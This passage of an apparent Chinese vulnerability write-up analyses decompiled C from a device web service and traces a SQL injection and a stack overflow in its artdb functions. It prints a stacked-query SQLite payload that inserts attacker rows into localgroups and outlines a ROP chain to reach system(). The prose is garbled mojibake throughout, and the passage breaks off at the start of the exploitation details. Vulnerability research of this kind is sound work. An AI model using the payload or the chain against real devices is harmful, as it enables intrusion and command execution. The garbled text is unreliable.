&#125;</span><br><span class="line">  root = xmlDocGetRootElement(reqDoc);</span><br><span class="line">  <span class="keyword">if</span> ( !root )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( englog_is_on() )</span><br><span class="line">      englog_helper(<span class="number">1u</span>, <span class="number">1u</span>, <span class="string">&quot;(%s) failed to parse request (2)&quot;</span>, <span class="string">&quot;handle_replication_group_info_req&quot;</span>);</span><br><span class="line">    <span class="keyword">goto</span> proc_done;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> ( reqNode = root-&gt;children; reqNode &amp;&amp; <span class="built_in">strcmp</span>(reqNode-&gt;name, <span class="string">&quot;GroupInfoRequest&quot;</span>); reqNode = reqNode-&gt;next )</span><br><span class="line">    ;</span><br><span class="line">  <span class="keyword">if</span> ( !reqNode )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( englog_is_on() )</span><br><span class="line">      englog_helper(<span class="number">1u</span>, <span class="number">1u</span>, <span class="string">&quot;(%s) failed to parse request (3)&quot;</span>, <span class="string">&quot;handle_replication_group_info_req&quot;</span>);</span><br><span class="line">    <span class="keyword">goto</span> proc_done;</span><br><span class="line">  &#125;</span><br><span class="line">  ret = artdb_open(&amp;db, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( ret )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( englog_is_on() )</span><br><span class="line">      englog_helper(<span class="number">1u</span>, <span class="number">1u</span>, <span class="string">&quot;(%s) Failed to get replication information (1)&quot;</span>, <span class="string">&quot;handle_replication_group_info_req&quot;</span>);</span><br><span class="line">    <span class="keyword">goto</span> proc_done;</span><br><span class="line">  &#125;</span><br><span class="line">  repDoc = xmlNewDoc(<span class="string">&quot;1.0&quot;</span>);</span><br><span class="line">  root = xmlNewNode(<span class="number">0LL</span>, <span class="string">&quot;ART_REP&quot;</span>);</span><br><span class="line">  xmlDocSetRootElement(repDoc, root);</span><br><span class="line">  repNode = xmlNewChild(root, <span class="number">0LL</span>, <span class="string">&quot;GroupInfoReply&quot;</span>, <span class="number">0LL</span>);</span><br><span class="line">  ret = artdb_rep_get_group_id(db, &amp;groupID);</span><br><span class="line">  <span class="keyword">if</span> ( ret )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( englog_is_on() )</span><br><span class="line">      englog_helper(<span class="number">1u</span>, <span class="number">1u</span>, <span class="string">&quot;(%s) Failed to get replication group ID (%d)&quot;</span>, <span class="string">&quot;handle_replication_group_info_req&quot;</span>, ret);</span><br><span class="line">    <span class="keyword">goto</span> proc_done;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( groupID )</span><br><span class="line">    xmlNewProp(repNode, &amp;off_6F0BED, groupID);</span><br><span class="line">  ret = artdb_get_version(db, &amp;dbVerMaj, &amp;dbVerMin, &amp;dbBuild);</span><br><span class="line">  <span class="keyword">if</span> ( ret )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( englog_is_on() )</span><br><span class="line">      englog_helper(</span><br><span class="line">        <span class="number">1u</span>,</span><br><span class="line">        <span class="number">1u</span>,</span><br><span class="line">        <span class="string">&quot;(%s) Failed to get ART server version information (%d)&quot;</span>,</span><br><span class="line">        <span class="string">&quot;handle_replication_group_info_req&quot;</span>,</span><br><span class="line">        ret);</span><br><span class="line">    <span class="keyword">goto</span> proc_done;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">sprintf</span>(st, <span class="string">&quot;%d&quot;</span>, dbVerMaj);</span><br><span class="line">  xmlNewProp(repNode, <span class="string">&quot;DBMaj&quot;</span>, st);</span><br><span class="line">  <span class="built_in">sprintf</span>(st, <span class="string">&quot;%d&quot;</span>, dbVerMin);</span><br><span class="line">  xmlNewProp(repNode, <span class="string">&quot;DBMin&quot;</span>, st);</span><br><span class="line">  <span class="built_in">sprintf</span>(st, <span class="string">&quot;%d&quot;</span>, dbBuild);</span><br><span class="line">  xmlNewProp(repNode, <span class="string">&quot;DBBuild&quot;</span>, st);</span><br><span class="line"><span class="comment">// ...</span></span><br></pre></td></tr></table></figure></div>
<p>ä»£ç ä¸­ä½¿ç”¨ artdb_open æ‰“å¼€æ•°æ®åº“ï¼Œç„¶åé€šè¿‡ artdb_rep_get_group_id ç­‰ API ä»æ•°æ®åº“ä¸­æŸ¥è¯¢ç›¸å…³æ•°æ®ï¼Œæœ€åå°†ç»“æœè½¬æ¢æˆ XML æ ¼å¼è¿”å›ã€‚å…¶ä»–æ¥å£åŠŸèƒ½ç±»ä¼¼ã€‚</p>
<p>è¯·æ±‚å’Œå“åº”æ ·ä¾‹ï¼š</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /replication/groupinfo HTTP/1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">Content-Type: application/xml</span><br><span class="line">Content-Length: 58</span><br><span class="line"></span><br><span class="line">&lt;xml&gt;</span><br><span class="line">  &lt;GroupInfoRequest&gt;</span><br><span class="line">  &lt;/GroupInfoRequest&gt;</span><br><span class="line">&lt;/xml&gt;</span><br></pre></td></tr></table></figure></div>

<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Content-Length: 98</span><br><span class="line">Date: Wed, 16 Nov 2022 05:56:44 GMT</span><br><span class="line">Server: lighttpd/1.4.35</span><br><span class="line"></span><br><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;ART_REP&gt;&lt;GroupInfoReply GID=&quot;&quot; DBMaj=&quot;4&quot; DBMin=&quot;0&quot; DBBuild=&quot;7&quot;/&gt;&lt;/ART_REP&gt;</span><br></pre></td></tr></table></figure></div>

<p>é€šè¿‡å¯¹å„ä¸ªåŠŸèƒ½è¿›è¡Œåˆ†æï¼Œå¯ä»¥æ‰¾åˆ°å¤šå¤„ä½¿ç”¨ä¸å®‰å…¨ API å¤„ç†å­—ç¬¦æ•°æ®çš„ä»£ç ç‰‡æ®µï¼Œä¾‹å¦‚å‡½æ•° artdb_get_user_idï¼š</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">artdb_get_user_id</span><span class="params">(sqlite3_0 *prmDB, <span class="type">int</span> prmInstID, <span class="type">char</span> *prmUsername, <span class="type">int</span> *prmUserID)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// [rsp+1Ch] [rbp-844h]</span></span><br><span class="line">  <span class="type">char</span> sql[<span class="number">2049</span>]; <span class="comment">// [rsp+40h] [rbp-820h] BYREF</span></span><br><span class="line">  <span class="type">char</span> *eMsg; <span class="comment">// [rsp+848h] [rbp-18h] BYREF</span></span><br><span class="line">  <span class="type">int</span> rows; <span class="comment">// [rsp+850h] [rbp-10h] BYREF</span></span><br><span class="line">  <span class="type">int</span> cols; <span class="comment">// [rsp+854h] [rbp-Ch] BYREF</span></span><br><span class="line">  <span class="type">char</span> **tblRes; <span class="comment">// [rsp+858h] [rbp-8h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( prmDB )</span><br><span class="line">  &#123;</span><br><span class="line">    eMsg = <span class="number">0LL</span>;</span><br><span class="line">    <span class="built_in">sprintf</span>(</span><br><span class="line">      sql,</span><br><span class="line">      <span class="string">&quot;select * from %s where (%s=%d) and (lower(%s)=lower(&#x27;%s&#x27;))&quot;</span>,</span><br><span class="line">      <span class="string">&quot;localusers&quot;</span>,</span><br><span class="line">      <span class="string">&quot;inst_id&quot;</span>,</span><br><span class="line">      prmInstID,</span><br><span class="line">      <span class="string">&quot;uname&quot;</span>,</span><br><span class="line">      prmUsername);</span><br><span class="line">    <span class="keyword">if</span> ( sqlite3_get_table(prmDB, sql, &amp;tblRes, &amp;rows, &amp;cols, &amp;eMsg) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( englog_is_on() )</span><br><span class="line">        englog_helper(<span class="number">1u</span>, <span class="number">1u</span>, <span class="string">&quot;(%s) failed to get users table (%s)&quot;</span>, <span class="string">&quot;artdb_get_user_id&quot;</span>, eMsg);</span><br><span class="line">      sqlite3_free(eMsg);</span><br><span class="line">      v6 = <span class="number">-4</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( rows &lt;= <span class="number">0</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        *prmUserID = <span class="number">-1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        v4 = artdb_table_cell(<span class="number">0</span>, <span class="number">1</span>, cols);</span><br><span class="line">        *prmUserID = atoi(tblRes[v4]);</span><br><span class="line">        <span class="keyword">if</span> ( rows &gt; <span class="number">1</span> &amp;&amp; englog_is_on() )</span><br><span class="line">          englog_helper(<span class="number">1u</span>, <span class="number">2u</span>, <span class="string">&quot;(%s) username %s has more than one row (%d)&quot;</span>, <span class="string">&quot;artdb_get_user_id&quot;</span>, prmUsername, rows);</span><br><span class="line">      &#125;</span><br><span class="line">      sqlite3_free(eMsg);</span><br><span class="line">      sqlite3_free_table(tblRes);</span><br><span class="line">      v6 = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( englog_is_on() )</span><br><span class="line">      englog_helper(<span class="number">1u</span>, <span class="number">1u</span>, <span class="string">&quot;(%s) NULL database pointer&quot;</span>, <span class="string">&quot;artdb_get_user_id&quot;</span>);</span><br><span class="line">    v6 = <span class="number">-2</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v6;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>ç¬¬ 14 è¡Œä½¿ç”¨ sprintf å‡½æ•°æ„é€  sql æŸ¥è¯¢è¯­å¥ï¼Œå…¶ä¸­ prmUsername å‚æ•°æ˜¯æˆ‘ä»¬å¯æ§çš„æ•°æ®ï¼Œæœ‰å¾ˆå¤šé€”å¾„éƒ½å¯ä»¥è§¦å‘ï¼Œé‚£ä¹ˆè¿™é‡Œæ˜¾ç„¶å­˜åœ¨æ ˆæº¢å‡ºæ¼æ´ã€‚å¦å¤–ï¼Œæ„é€ å‡ºæ¥çš„ sql è¯­å¥æ²¡æœ‰ç»è¿‡ä»»ä½•è¿‡æ»¤å°±ä½¿ç”¨ sqlite3_get_table æ‰§è¡Œï¼Œå­˜åœ¨ sql æ³¨å…¥æ¼æ´ã€‚</p>
<h2 id="æ¼æ´åˆ©ç”¨åˆ†æ"><a href="#æ¼æ´åˆ©ç”¨åˆ†æ" class="headerlink" title="æ¼æ´åˆ©ç”¨åˆ†æ"></a>æ¼æ´åˆ©ç”¨åˆ†æ</h2><p>é¦–å…ˆè€ƒè™‘æ ˆæº¢å‡ºï¼Œç›®æ ‡ç¨‹åºä¿¡æ¯</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    No RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX disabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br><span class="line">RWX:      Has RWX segments</span><br></pre></td></tr></table></figure></div>

<p>æ²¡æœ‰å¼€å¯ä¿æŠ¤æªæ–½ï¼Œæ¶æ„ä¸º x64ï¼Œç”±äºæ•°æ®æ˜¯ä» HTTP Query_String ä¼ å…¥çš„ï¼Œæ‰€ä»¥ä¸èƒ½å‡ºç°ç‰¹æ®Šå­—ç¬¦ï¼Œå¦‚ 00 å­—ç¬¦ã€‚è¿™å°±å¯¼è‡´æˆ‘ä»¬å¯èƒ½åªèƒ½åŠ«æŒè¿”å›åœ°å€ï¼Œä¸èƒ½ç›´æ¥æ„é€  ROPã€‚</p>
<p>å†æ¬¡è§‚å¯Ÿæ¼æ´ä»£ç ï¼Œsprintf è¯­å¥çš„ format string åœ¨å¯æ§æ•°æ®ä¹‹åè¿˜æœ‰å‡ ä¸ªå­—ç¬¦ <code>&#39;))</code>ï¼Œç”±äºè¿™äº›å­—ç¬¦ä¼šæ‹¼æ¥åœ¨ payload åé¢ï¼Œå¯¼è‡´ä¹Ÿæ²¡åŠæ³•åŠ«æŒè¿”å›åœ°å€ã€‚</p>
<p>è€ƒè™‘ sql æ³¨å…¥æ¼æ´ï¼Œç›®æ ‡æ•°æ®åº“æ˜¯ sqliteï¼Œå¸¸è§„çš„åˆ©ç”¨æ€è·¯å¯ä»¥ä»æ•°æ®åº“ä¸­æ³„éœ²æŸäº›æ•æ„Ÿä¿¡æ¯ï¼Œæˆ–è€…æ˜¯å‘ web ç›®å½•åˆ›å»º php åé—¨ã€åŠ è½½è‡ªå·±ä¸Šä¼ çš„ so æ–‡ä»¶ç­‰ã€‚é»˜è®¤æƒ…å†µä¸‹ &#x2F;ca&#x2F;bin&#x2F;artdb ä¸­åº”è¯¥æ²¡æœ‰å†…å®¹ï¼Œä¸Šä¼ æ–‡ä»¶æˆ–å‘ web ç›®å½•å†™ php éƒ½éœ€è¦å…ˆç»•è¿‡ web ç™»å½•ï¼Œä¹Ÿéš¾ä»¥å®ç°ã€‚</p>
<h2 id="ç‰¹æ®Šå½¢å¼çš„æ ˆæº¢å‡º"><a href="#ç‰¹æ®Šå½¢å¼çš„æ ˆæº¢å‡º" class="headerlink" title="ç‰¹æ®Šå½¢å¼çš„æ ˆæº¢å‡º"></a>ç‰¹æ®Šå½¢å¼çš„æ ˆæº¢å‡º</h2><p>ä»¥ä¸Šæ¯”è¾ƒæ˜æ˜¾çš„æ¼æ´æš‚æ—¶æ²¡æœ‰åˆ©ç”¨æ€è·¯ï¼Œç»§ç»­åˆ†æä»£ç ã€‚åœ¨ &#x2F;query&#x2F;hosts è·¯ç”±å¯¹åº”çš„å‡½æ•°ä¸­æœ‰ä¸‹é¢çš„é€»è¾‘ï¼š</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ...</span></span><br><span class="line">gnames = buf_get_delim_param(prmCon-&gt;uri.query-&gt;ptr, <span class="string">&quot;_role&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> ( gnames || !check_device_identification_result(db, instID, userID, uname-&gt;ptr, prmCon, &amp;devIDRes) )</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> ( gnames )</span><br><span class="line">    &#123;</span><br><span class="line">        buffer_urldecode_query(gnames);</span><br><span class="line">        ret = artdb_get_groupIDs_by_request(db, instID, gnames-&gt;ptr, &amp;groupIDs, &amp;count);</span><br><span class="line">        <span class="keyword">if</span> ( ret )</span><br><span class="line">            <span class="keyword">goto</span> done_and_close;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// ...</span></span><br></pre></td></tr></table></figure></div>

<p>è·å–ç”¨æˆ·å‚æ•° _roleï¼Œè¿›è¡Œ url è§£ç ä¹‹åä¼ å…¥ artdb_get_groupIDs_by_request å‡½æ•°ã€‚</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">artdb_get_groupIDs_by_request</span><span class="params">(sqlite3_0 *prmDB, <span class="type">int</span> instID, <span class="type">char</span> *gnames, <span class="type">int</span> **prmGroupIDs, <span class="type">int</span> *prmCount)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> groupID; <span class="comment">// [rsp+3Ch] [rbp-1024h] BYREF</span></span><br><span class="line">  <span class="type">int</span> groupIDs[<span class="number">1024</span>]; <span class="comment">// [rsp+40h] [rbp-1020h] BYREF</span></span><br><span class="line">  <span class="type">char</span> *pCur; <span class="comment">// [rsp+1040h] [rbp-20h]</span></span><br><span class="line">  <span class="type">char</span> *pNext; <span class="comment">// [rsp+1048h] [rbp-18h]</span></span><br><span class="line">  <span class="type">char</span> *pName; <span class="comment">// [rsp+1050h] [rbp-10h]</span></span><br><span class="line">  <span class="type">int</span> ret; <span class="comment">// [rsp+1058h] [rbp-8h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+105Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  ret = <span class="number">0</span>;</span><br><span class="line">  i = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( pCur = gnames; pCur; pCur = pNext + <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    pNext = <span class="built_in">strchr</span>(pCur, <span class="string">&#x27;:&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !pNext )</span><br><span class="line">    &#123;</span><br><span class="line">      pName = pCur;</span><br><span class="line">      ret = artdb_get_group_id(prmDB, instID, pCur, &amp;groupID);</span><br><span class="line">      <span class="keyword">if</span> ( ret )</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-4</span>;</span><br><span class="line">      <span class="keyword">if</span> ( groupID != <span class="number">-1</span> )</span><br><span class="line">        groupIDs[i++] = groupID;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    pName = pCur;</span><br><span class="line">    *pNext = <span class="number">0</span>;</span><br><span class="line">    ret = artdb_get_group_id(prmDB, instID, pName, &amp;groupID);</span><br><span class="line">    <span class="keyword">if</span> ( ret )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">-4</span>;</span><br><span class="line">    <span class="keyword">if</span> ( groupID != <span class="number">-1</span> )</span><br><span class="line">      groupIDs[i++] = groupID;</span><br><span class="line">  &#125;</span><br><span class="line">  *prmCount = i;</span><br><span class="line">  <span class="keyword">if</span> ( !i )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_20;</span><br><span class="line">  *prmGroupIDs = <span class="built_in">malloc</span>(<span class="number">4LL</span> * i);</span><br><span class="line">  <span class="keyword">if</span> ( *prmGroupIDs )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">memset</span>(*prmGroupIDs, <span class="number">0</span>, <span class="number">4LL</span> * i);</span><br><span class="line">    <span class="built_in">memcpy</span>(*prmGroupIDs, groupIDs, <span class="number">4LL</span> * i);</span><br><span class="line">LABEL_20:</span><br><span class="line">    ret = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( englog_is_on() )</span><br><span class="line">    englog_helper(<span class="number">1u</span>, <span class="number">1u</span>, <span class="string">&quot;(%s) failed to allocate the user_webaclIDS (%d)&quot;</span>, <span class="string">&quot;artdb_get_groupIDs_by_request&quot;</span>, <span class="number">4LL</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">-5</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>å‡½æ•°ç¬¬ä¸‰ä¸ªå‚æ•°æ˜¯ç”¨æˆ·å¯æ§çš„ _role å‚æ•°ï¼Œè¿›å…¥ for å¾ªç¯å¯¹è¯¥å­—ç¬¦ä¸²éå†ï¼Œæ¯æ¬¡éƒ½å¯»æ‰¾å†’å·ã€‚è·å–å†’å·ä¹‹å‰çš„ä¸€é¡¹ï¼Œå°†å…¶ä½œä¸ºå‚æ•°ä¼ å…¥ artdb_get_group_id å‡½æ•°ã€‚ç”±æ­¤å¯ä»¥æ¨æ–­ _role æ˜¯ä¸€ç§ç”¨å†’å·åˆ†éš”çš„å­—ç¬¦ä¸²æ•°æ®ã€‚</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">artdb_get_group_id</span><span class="params">(sqlite3_0 *prmDB, <span class="type">int</span> prmInstID, <span class="type">char</span> *prmGroupname, <span class="type">int</span> *prmGroupID)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// [rsp+1Ch] [rbp-844h]</span></span><br><span class="line">  <span class="type">char</span> sql[<span class="number">2049</span>]; <span class="comment">// [rsp+40h] [rbp-820h] BYREF</span></span><br><span class="line">  <span class="type">char</span> *eMsg; <span class="comment">// [rsp+848h] [rbp-18h] BYREF</span></span><br><span class="line">  <span class="type">int</span> rows; <span class="comment">// [rsp+850h] [rbp-10h] BYREF</span></span><br><span class="line">  <span class="type">int</span> cols; <span class="comment">// [rsp+854h] [rbp-Ch] BYREF</span></span><br><span class="line">  <span class="type">char</span> **tblRes; <span class="comment">// [rsp+858h] [rbp-8h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( prmDB )</span><br><span class="line">  &#123;</span><br><span class="line">    eMsg = <span class="number">0LL</span>;</span><br><span class="line">    <span class="built_in">sprintf</span>(</span><br><span class="line">      sql,</span><br><span class="line">      <span class="string">&quot;select * from %s where %s=%d and %s=&#x27;%s&#x27;&quot;</span>,</span><br><span class="line">      <span class="string">&quot;localgroups&quot;</span>,</span><br><span class="line">      <span class="string">&quot;inst_id&quot;</span>,</span><br><span class="line">      prmInstID,</span><br><span class="line">      <span class="string">&quot;groupname&quot;</span>,</span><br><span class="line">      prmGroupname);</span><br><span class="line">    <span class="keyword">if</span> ( sqlite3_get_table(prmDB, sql, &amp;tblRes, &amp;rows, &amp;cols, &amp;eMsg) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( englog_is_on() )</span><br><span class="line">        englog_helper(<span class="number">1u</span>, <span class="number">1u</span>, <span class="string">&quot;(%s) failed to get groups table (%s)&quot;</span>, <span class="string">&quot;artdb_get_group_id&quot;</span>, eMsg);</span><br><span class="line">      sqlite3_free(eMsg);</span><br><span class="line">      v6 = <span class="number">-4</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( rows &lt;= <span class="number">0</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        *prmGroupID = <span class="number">-1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        v4 = artdb_table_cell(<span class="number">0</span>, <span class="number">1</span>, cols);</span><br><span class="line">        *prmGroupID = atoi(tblRes[v4]);</span><br><span class="line">        <span class="keyword">if</span> ( rows &gt; <span class="number">1</span> &amp;&amp; englog_is_on() )</span><br><span class="line">          englog_helper(</span><br><span class="line">            <span class="number">1u</span>,</span><br><span class="line">            <span class="number">2u</span>,</span><br><span class="line">            <span class="string">&quot;(%s) groupname %s has more than one row (%d)&quot;</span>,</span><br><span class="line">            <span class="string">&quot;artdb_get_group_id&quot;</span>,</span><br><span class="line">            prmGroupname,</span><br><span class="line">            rows);</span><br><span class="line">      &#125;</span><br><span class="line">      sqlite3_free(eMsg);</span><br><span class="line">      sqlite3_free_table(tblRes);</span><br><span class="line">      v6 = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( englog_is_on() )</span><br><span class="line">      englog_helper(<span class="number">1u</span>, <span class="number">1u</span>, <span class="string">&quot;(%s) NULL database pointer&quot;</span>, <span class="string">&quot;artdb_get_group_id&quot;</span>);</span><br><span class="line">    v6 = <span class="number">-2</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v6;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>è¿™é‡Œä» localgroups è¡¨ä¸­æŸ¥æ‰¾å¯¹åº”çš„ groupname æ¡ç›®ï¼Œè·å–åˆ°å®ƒçš„ groupIDï¼Œç»è¿‡ atoi è½¬æ¢æˆ int å‹æ•°æ®è¿”å›ã€‚</p>
<p>è¿”å›ä¹‹ååœ¨å¾ªç¯ä¸­å°† ID èµ‹å€¼åˆ°ä½äºæ ˆçš„æ•°ç»„ groupIDs ä¸­ï¼Œç„¶åå†å¤„ç†ä¸‹ä¸€é¡¹æ•°æ®ã€‚å‘æ•°ç»„æ’å…¥å¤šå°‘æ•°æ®æ˜¯æ ¹æ® _role å‚æ•°ä¸­æœ‰å¤šå°‘é¡¹ç›®å†³å®šçš„ï¼Œä¹Ÿå°±æ˜¯è¯´å¦‚æœæ•°æ®åº“ä¸­çš„å†…å®¹å¯æ§ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥æ„é€ è¾ƒé•¿çš„ _role å‚æ•°ï¼Œå¾ªç¯ä¸æ–­å‘ groupIDs æ•°ç»„å†™å…¥å†…å®¹ï¼Œæœ€ç»ˆå°†å¯¼è‡´æ ˆæº¢å‡ºã€‚</p>
<p>è¿™ä¸ªæ ˆæº¢å‡ºå’Œå…¶ä»–ä½ç½®çš„ä¸åŒï¼Œç”±äºå†™å…¥çš„æ•°æ®æ˜¯ int ç±»å‹ï¼Œæˆ‘ä»¬æ— éœ€æ‹…å¿ƒç‰¹æ®Šå­—ç¬¦çš„é—®é¢˜ï¼Œå¯ä»¥ç›´æ¥æ„é€  ROP å®Œæˆåˆ©ç”¨ã€‚</p>
<h2 id="æ§åˆ¶æ•°æ®åº“"><a href="#æ§åˆ¶æ•°æ®åº“" class="headerlink" title="æ§åˆ¶æ•°æ®åº“"></a>æ§åˆ¶æ•°æ®åº“</h2><p>æˆ‘ä»¬å·²ç»æœ‰ sql æ³¨å…¥æ¼æ´ï¼Œç”±äº sqlite çš„ç‰¹æ€§ï¼Œåœ¨ä¸€æ¡ sql è¯­å¥ä¹‹åæ‹¼æ¥åˆ†å·å¯ä»¥æ‰§è¡Œå¦ä¸€æ¡è¯­å¥ã€‚æ‰€ä»¥å¯ä»¥å…ˆå°†åŸå§‹æŸ¥è¯¢è¯­å¥æ­£ç¡®é—­åˆï¼Œåœ¨åˆ†å·åé¢å‘ localgroups è¡¨ä¸­æ’å…¥ payload æ•°æ®ï¼Œæœ€åæ³¨é‡Šæ‰åç»­çš„éæ³•å­—ç¬¦å³å¯æ§åˆ¶æ•°æ®åº“ä¸­çš„æ•°æ®ã€‚</p>
<p>sql æ³¨å…¥ç‚¹æœ‰å¾ˆå¤šï¼Œæˆ‘ä»¬é€‰æ‹© &#x2F;query&#x2F;clientverification2 è·¯ç”±ï¼Œè€ƒå¯Ÿæ³¨å…¥ç‚¹ï¼š</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sprintf</span>(</span><br><span class="line">      sql,</span><br><span class="line">      <span class="string">&quot;select * from %s where (%s=%d) and (lower(%s)=lower(&#x27;%s&#x27;))&quot;</span>,</span><br><span class="line">      <span class="string">&quot;localusers&quot;</span>,</span><br><span class="line">      <span class="string">&quot;inst_id&quot;</span>,</span><br><span class="line">      prmInstID,</span><br><span class="line">      <span class="string">&quot;uname&quot;</span>,</span><br><span class="line">      prmUsername);</span><br></pre></td></tr></table></figure></div>
<p>å’Œä¹‹å‰ä»‹ç»çš„è¯­å¥ä¸€æ ·ï¼Œæ³¨å…¥éƒ¨åˆ†é¦–å…ˆæ„é€ å­—ç¬¦ä¸² <code>array&#39;));</code> å¯¹ select è¯­å¥è¿›è¡Œé—­åˆï¼Œç„¶åæ„é€  insert è¯­å¥å°†æ•°æ®æ’å…¥è¡¨ä¸­ï¼Œä¾‹å¦‚</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">insert/**/into/**/localgroups/**/(group_id,inst_id,groupname,params)/**/values/**/(123,1,&quot;test&quot;,&quot;p&quot;);/**/--</span><br></pre></td></tr></table></figure></div>
<p>ç©ºæ ¼éƒ¨åˆ†ç”¨ <code>/**/</code> æ›¿ä»£ã€‚</p>
<h2 id="åˆ©ç”¨åˆ†æ"><a href="#åˆ©ç”¨åˆ†æ" class="headerlink" title="åˆ©ç”¨åˆ†æ"></a>åˆ©ç”¨åˆ†æ</h2><p>æ¼æ´æœ¬è´¨ä¸Šæ˜¯æ ˆæº¢å‡ºï¼Œæ‰€ä»¥åŸºæœ¬æ€è·¯å°±æ˜¯æ„é€  ROP å»è°ƒç”¨ system æ‰§è¡Œå‘½ä»¤ã€‚ä¸è¿‡åœ¨åˆ©ç”¨è¿‡ç¨‹ä¸­å­˜åœ¨ä¸€äº›ç»†èŠ‚é—®é¢˜ã€‚</p>
<p><strong>1. æŒ‡é’ˆé—®é¢˜</strong></p>
